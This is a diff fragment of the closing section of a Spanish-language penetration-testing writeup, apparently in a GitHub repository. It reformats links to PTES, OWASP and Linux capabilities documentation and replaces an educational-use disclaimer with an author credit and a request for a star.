+  <a href="http://www.pentest-standard.org/">PTES Standard</a> • 
+  <a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQLi</a> • 
+  <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux Capabilities</a>
+</div>
 
-- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
-- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-- [Linux Capabilities — `cap_setuid`](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [Flask Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
-
----
-
-> ✍️ Writeup realizado con fines educativos y en un entorno autorizado.
-> Si te sirvió, dale una ⭐ al repositorio.
+> ✍️ **Writeup creado por Andrés Vallejo**.  
+> *Consultor Senior en Ciberseguridad | Red Team Operative*  
+> Si esta documentación te ha sido útil, apóyame con una ⭐ en el repositorio de GitHub.
